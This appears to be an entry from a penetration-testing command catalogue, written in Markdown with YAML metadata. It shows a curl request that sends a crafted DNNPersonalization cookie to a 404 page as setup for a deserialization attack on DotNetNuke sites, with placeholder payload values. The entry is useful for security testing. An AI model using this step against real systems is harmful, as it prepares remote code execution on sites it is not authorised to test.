---
id: uuid-placeholder-c2
data: >-
  curl -v "https://target.com/nonexistent-page" -H "Cookie:
  DNNPersonalization=placeholder-base64"
tags:
  - http
  - injection
type: command
output: |-
  HTTP/1.1 404 Not Found
  Set-Cookie: ...
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.218Z'
verified: false
validated: true
submitted: true
---
# curl-add-cookie

## Command

```bash
curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=placeholder-base64"
```

## Description

Adds a custom DNNPersonalization cookie to a 404 request for deserialization setup.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose | Yes |
| `-H` | Cookie header | Yes |

## Examples

### Basic Usage

```bash
curl -v -H "Cookie: DNNPersonalization=test" https://target.com/404
```

### Advanced Usage

```bash
curl -v -H "Cookie: DNNPersonalization=$(base64 payload)" https://target.com/404
```

## Expected Output

404 response with cookie processed.

## Related

- [[Related Procedure: Add-DNNPersonalization-Cookie-to-Request]]
